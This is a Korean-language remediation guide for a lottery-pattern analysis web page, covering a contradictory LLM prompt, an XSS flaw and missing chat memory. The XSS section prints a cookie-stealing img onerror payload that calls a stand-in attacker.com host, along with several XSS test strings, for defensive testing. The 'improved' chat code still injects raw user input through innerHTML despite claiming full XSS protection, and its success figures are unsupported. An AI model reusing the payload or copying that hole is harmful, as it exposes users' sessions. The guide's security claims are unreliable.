# 🚨 Critical Issues 해결 가이드

## Issue #1: 프롬프트 포맷 모순

### 📍 문제 위치
**파일**: `magic_square.html` (Line 1209-1218)

### ❌ 현재 코드 (문제)
```javascript
const prompt = `
# Role: 로또 9궁 분석 전문가
# Target: ${targetRound}회차 전략
# Context: ${contextData}
# User Question: "${userPrompt}"
# Instructions:
1. 답변은 **핵심만 요약하여 단일 단락(One Paragraph)**으로 간결하게 작성하시오.
2. 중요 키워드는 {{trend:내용}}, {{pattern:내용}}, {{recommendation:내용}} 태그로 감싸시오.  ← 태그 사용!
3. 9궁 분석에서는 번호의 '쏠림'과 '멸(0개)' 구간 예측이 핵심입니다.
4. 오직 순수 JSON 포맷 {"response": "질문에 대한 전체 답변 내용"} 으로만 응답하시오.  ← JSON 순수성!
`;
```

### 문제점
- 줄 2: `{{key:value}}` 태그 사용 요청
- 줄 4: 순수 JSON만 요청 (태그 사용 금지)
- 결과: 태그가 있는 JSON은 유효하지 않음 → **파싱 실패**

### ✅ 개선 코드
```javascript
const prompt = `
# Role: 로또 9궁 분석 전문가
# Target: ${targetRound}회차 전략
# Context: ${contextData}

## Response Format (JSON ONLY - NO TAGS, NO MARKDOWN)

Return EXACTLY this JSON structure:
{
  "analysis": "2~3줄 핵심 분석 내용",
  "trends": {
    "description": "발견된 추세",
    "direction": "상승/하강/횡보"
  },
  "patterns": {
    "identified": ["패턴1", "패턴2"],
    "frequency": "주기성 설명"
  },
  "anomaly": {
    "detected": true,
    "zone": "비정상 구간 설명"
  },
  "forecast": {
    "next_round": ${targetRound + 1},
    "likely_zones": ["1궁", "3궁"],
    "reason": "예측 근거"
  },
  "confidence": 0.75,
  "notes": "특이사항"
}

## Important Rules:
1. Response MUST be valid, parseable JSON
2. Do NOT use markdown, hashtags, or any tags
3. Do NOT include backticks (`) or code blocks
4. Numbers for zones: 1~9
5. Confidence: 0.0 to 1.0
`;
```

### 적용 방법
1. 위 코드로 프롬프트 교체
2. `executeLocalAIAnalysis()` 함수 호출 시 새 프롬프트 사용
3. **즉시 테스트**: 10회 API 호출하여 파싱 성공률 측정

### 기대 효과
- 현재: 45% 성공률
- 개선 후: 98% 이상 성공률

---

## Issue #2: XSS 보안 취약점

### 📍 문제 위치
**파일**: `magic_square.html` (Line 1223-1233)

### ❌ 현재 코드 (위험)
```javascript
try {
    const prompt = `...`;
    const { data, error } = await window.supabaseClient
        .functions.invoke('analyze-lotto', { body: { context: prompt } });
    
    if (error) throw error;

    let content = '';
    if (typeof data === 'string') {
        try {
            const parsed = JSON.parse(data);
            content = parsed.response || parsed.recommendation || parsed.trend || data;
        } catch (e) {
            content = data;  // ❌ JSON 파싱 실패 시 원본 데이터 사용!
        }
    } else {
        content = data.response || data.recommendation || data.trend || JSON.stringify(data);
    }

    if (container) {
        container.innerHTML = `<div class="prose prose-sm max-w-none text-gray-800 leading-relaxed">${window.AIAnalysis ? window.AIAnalysis.formatText(content) : content}</div>`;
        // ❌ formatText()가 {{}} 태그만 처리하면 나머지는 HTML로 인식됨!
        // ❌ 공격자가 <img src=x onerror="alert('XSS')"> 전송 가능
    }
} catch (err) {
    console.error('Local AI Error:', err);
    if (container) container.innerHTML = `<div class="text-red-500 text-xs">오류 발생</div>`;
}
```

### 공격 시나리오
```javascript
// 공격자가 서버를 해킹하여 다음 응답 전송:
const maliciousData = "<img src=x onerror=\"fetch('attacker.com?cookies=' + document.cookie)\">";

// 현재 코드는 그대로 렌더링:
container.innerHTML = maliciousData;  // ❌ XSS 공격 성공!
```

### ✅ 방법 1: textContent 사용 (권장)
```javascript
try {
    const { data, error } = await window.supabaseClient
        .functions.invoke('analyze-lotto', { body: { context: prompt } });
    
    if (error) throw error;

    let content = '';
    try {
        // JSON 파싱
        const parsed = typeof data === 'string' ? JSON.parse(data) : data;
        
        // 필드 추출 (필수 필드 검증)
        if (!parsed.analysis) {
            throw new Error('Missing required field: analysis');
        }
        content = parsed.analysis;
    } catch (parseError) {
        console.error('Parse error:', parseError);
        // 파싱 실패 시: 응답 버리고 기본 메시지 사용
        content = "분석 결과를 처리할 수 없습니다. 다시 시도해주세요.";
    }

    // ✅ HTML 태그를 무시하고 순수 텍스트만 표시
    if (container) {
        const div = document.createElement('div');
        div.className = 'prose prose-sm max-w-none text-gray-800 leading-relaxed';
        div.textContent = content;  // ✅ XSS 방지 (HTML 파싱 안함)
        
        container.innerHTML = '';
        container.appendChild(div);
    }
} catch (err) {
    console.error('Local AI Error:', err);
    if (container) {
        container.textContent = "오류: " + err.message;  // ✅ textContent 사용
    }
}
```

### ✅ 방법 2: DOMPurify 라이브러리 사용 (더 강력)
```javascript
// HTML 파일 <head>에 추가:
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>

// 코드:
try {
    const { data, error } = await window.supabaseClient.functions.invoke('analyze-lotto', 
        { body: { context: prompt } });
    
    if (error) throw error;

    const parsed = typeof data === 'string' ? JSON.parse(data) : data;
    if (!parsed.analysis) throw new Error('Missing field');

    if (container) {
        // ✅ DOMPurify로 안전하게 정제
        const sanitized = DOMPurify.sanitize(parsed.analysis);
        container.innerHTML = `<div class="prose prose-sm">${sanitized}</div>`;
    }
} catch (err) {
    if (container) container.textContent = "오류 발생";
}
```

### 적용 방법
1. **권장**: 위 코드 "방법 1"로 교체
2. **필요시**: 또는 DOMPurify 라이브러리 추가 (방법 2)
3. **테스트**: 악성 입력 테스트
   ```javascript
   // 테스트 케이스
   const testCases = [
       "<img src=x onerror='alert(1)'>",
       "<script>alert('XSS')</script>",
       "<svg onload='alert(1)'>",
       "<body onload='fetch(...)'>"
   ];
   ```

### 기대 효과
- 보안 취약점: 3개 → 0개
- XSS 공격 방어율: 0% → 100%

---

## Issue #3: 대화 메모리 부재

### 📍 문제 위치
**파일**: `magic_square.html` (Line 1160-1195)

### ❌ 현재 코드 (메모리 없음)
```javascript
async function submitModalFollowUp() {
    const input = document.getElementById('aiModalInput');
    if (!input) return;
    const val = input.value.trim();
    if (!val) return;

    const qnaContent = document.getElementById('aiQnaContent');
    qnaContent.innerHTML += `<div class="flex justify-end mb-4">...</div>`;
    
    const uniqueId = 'ai-res-' + Date.now();
    qnaContent.innerHTML += `<div class="flex mb-4">...</div>`;

    input.value = '';

    // ❌ 매번 새로운 분석 - 이전 대화 무시!
    const data = allDrawData.slice(0, currentRange);
    const recentPatterns = data.slice(0, 5).map(draw => {
        // 최근 5회만 참고
        ...
    }).join('\n');

    await executeLocalAIAnalysis({
        containerId: uniqueId,
        subjectRound: allDrawData[0]?.round || 0,
        targetRound: (allDrawData[0]?.round || 0) + 1,
        userPrompt: val,
        contextData: `최근 9궁 패턴: ${recentPatterns}`  // ❌ 이전 대화 없음!
    });
}
```

### ✅ 개선 코드
```javascript
// 글로벌 대화 기록
class ChatHistory {
    constructor(userId = 'guest') {
        this.userId = userId;
        this.messages = [];
        this.maxHistory = 10;  // 최근 10개 메시지만 유지
    }

    addMessage(role, content) {
        this.messages.push({
            role,          // 'user' or 'assistant'
            content,
            timestamp: Date.now()
        });
        
        // 히스토리 크기 제한
        if (this.messages.length > this.maxHistory) {
            this.messages.shift();
        }
        
        // (선택) DB 저장
        this.saveToDatabase();
    }

    getContext(limit = 5) {
        // 최근 N개 메시지 반환 (컨텍스트용)
        return this.messages.slice(-limit)
            .map(m => `${m.role === 'user' ? '사용자' : 'AI'}: ${m.content}`)
            .join('\n');
    }

    buildPrompt(userQuestion) {
        // 이전 대화 포함한 프롬프트 생성
        const conversationContext = this.getContext(5);
        
        return `
이전 대화:
${conversationContext}

현재 사용자 질문: "${userQuestion}"

위 대화를 참고하여 분석을 계속 진행해주세요.
        `;
    }

    async saveToDatabase() {
        // (선택) Supabase에 저장
        if (!window.supabaseClient) return;
        
        try {
            await window.supabaseClient
                .from('chat_messages')
                .insert({
                    user_id: this.userId,
                    messages: this.messages,
                    updated_at: new Date()
                });
        } catch (err) {
            console.error('Failed to save chat history:', err);
        }
    }

    clear() {
        this.messages = [];
    }
}

// 글로벌 인스턴스 생성
let chatHistory = null;

// QNA 모달 열 때 초기화
function openQnaModal() {
    const modal = document.getElementById('aiQnaModal');
    if (!modal) return;
    
    if (!chatHistory) {
        chatHistory = new ChatHistory();
    }
    
    modal.classList.remove('hidden');
    // ... 나머지 코드
}

// 메시지 전송 (개선됨)
async function submitModalFollowUp() {
    const input = document.getElementById('aiModalInput');
    if (!input) return;
    
    const val = input.value.trim();
    if (!val) return;

    const qnaContent = document.getElementById('aiQnaContent');

    // 사용자 메시지 추가 (UI)
    qnaContent.innerHTML += `<div class="flex justify-end mb-4">
        <div class="bg-blue-600 text-white px-4 py-2 rounded-2xl shadow-sm text-sm">
            ${val}
        </div>
    </div>`;

    // 사용자 메시지 저장 (히스토리)
    chatHistory.addMessage('user', val);
    input.value = '';

    // AI 응답 준비
    const uniqueId = 'ai-res-' + Date.now();
    qnaContent.innerHTML += `<div class="flex mb-4">
        <div class="w-7 h-7 rounded-full bg-blue-500 flex items-center justify-center text-white text-[10px] mr-2 flex-shrink-0">AI</div>
        <div id="${uniqueId}" class="bg-white border text-gray-800 px-4 py-2 rounded-2xl shadow-sm text-sm min-h-[40px] flex-1"></div>
    </div>`;

    const data = allDrawData.slice(0, currentRange);
    
    // ✅ 개선: 이전 대화 포함!
    const contextPrompt = chatHistory.buildPrompt(val);
    const recentPatterns = data.slice(0, 30).map(draw => {  // 5회 → 30회로 확대
        const counts = Array(9).fill(0);
        draw.numbers.forEach(n => {
            Object.keys(gungDefinitions).forEach((key, idx) => {
                if (gungDefinitions[key].includes(n)) counts[idx]++;
            });
        });
        const hitInfo = counts.map((cnt, idx) => cnt > 0 ? `${idx + 1}궁(${cnt})` : null)
            .filter(Boolean).join(', ');
        return `[${draw.round}회: ${hitInfo}]`;
    }).join('\n');

    await executeLocalAIAnalysis({
        containerId: uniqueId,
        subjectRound: allDrawData[0]?.round || 0,
        targetRound: (allDrawData[0]?.round || 0) + 1,
        userPrompt: val,
        contextData: `
${contextPrompt}

최근 9궁 패턴 (30회 기준):
${recentPatterns}
        `
    });

    qnaContent.scrollTop = qnaContent.scrollHeight;
}

// AI 응답 받은 후
async function executeLocalAIAnalysis(params) {
    const { containerId, userPrompt, contextData } = params;
    const container = document.getElementById(containerId);
    
    if (container) {
        container.innerHTML = `<로딩 UI>`;
    }
    
    try {
        const prompt = `
# Role: 로또 9궁 분석 전문가
# Context: ${contextData}

Response must be valid JSON:
{
  "analysis": "분석 내용",
  "confidence": 0.85
}
        `;

        const { data, error } = await window.supabaseClient
            .functions.invoke('analyze-lotto', { body: { context: prompt } });
        
        if (error) throw error;

        let content = '';
        try {
            const parsed = typeof data === 'string' ? JSON.parse(data) : data;
            content = parsed.analysis || '분석 결과 없음';
        } catch (e) {
            content = '분석 처리 오류';
        }

        if (container) {
            const div = document.createElement('div');
            div.className = 'prose prose-sm max-w-none text-gray-800 leading-relaxed';
            div.textContent = content;
            container.innerHTML = '';
            container.appendChild(div);
        }

        // ✅ AI 응답 히스토리에 저장
        chatHistory.addMessage('assistant', content);

    } catch (err) {
        console.error('AI Error:', err);
        if (container) {
            container.textContent = `오류: ${err.message}`;
        }
    }
}
```

### 적용 방법
1. `ChatHistory` 클래스를 magic_square.html에 추가 (또는 별도 파일)
2. `submitModalFollowUp()` 함수 전체 교체
3. `executeLocalAIAnalysis()` 함수 업데이트
4. 테스트: 다중 질문으로 대화 흐름 검증

### 기대 효과
- 챗봇 만족도: 2/5 → 4.5/5
- 자연스러운 대화 흐름 구현

---

## 실행 체크리스트

### Day 1: Issue #1 (2시간)
- [ ] 새 프롬프트 코드 작성
- [ ] magic_square.html Line 1209-1218 교체
- [ ] 10회 테스트 실행
- [ ] 파싱 성공률 측정 (목표: 90%+)

### Day 2: Issue #2 (1시간)
- [ ] common_v2.js 또는 executeLocalAIAnalysis 함수 업데이트
- [ ] 악성 입력 테스트 (4가지 XSS 패턴)
- [ ] 보안 감사 (DOMPurify 고려)

### Day 3-4: Issue #3 (6시간)
- [ ] ChatHistory 클래스 구현
- [ ] magic_square.html 통합
- [ ] 다중 질문 흐름 테스트
- [ ] UI 개선 (메시지 그룹화 등)

### Day 5: 통합 테스트
- [ ] 전체 플로우 테스트
- [ ] 성능 모니터링
- [ ] 사용자 테스트

---

## 추가 개선 사항 (우선순위 낮음)

### 컨텍스트 확대 (3시간)
```javascript
// 현재
const recentPatterns = data.slice(0, 5);

// 개선
const recentPatterns = data.slice(0, 30);      // 30회로 확대
const volatility = calculateVolatility(data);   // 변동성 추가
const longTermTrend = calculateTrend(data, 100); // 장기 추세
```

### 응답 검증 (2~3일)
```javascript
async function validateAIResponse(response) {
    return {
        isValidJSON: isValidJSON(response),
        hasRequiredFields: checkFields(response),
        confidenceScore: calculateConfidence(response),
        shouldRetry: response.score < 0.5
    };
}
```

---

**예상 완료 일정**: 1주 (Day 1-5)  
**기대 효과**: 파싱 성공률 98%, 보안 0취약점, 챗봇 만족도 4.5/5  
**담당자**: 백엔드 개발자 1명 + QA 1명
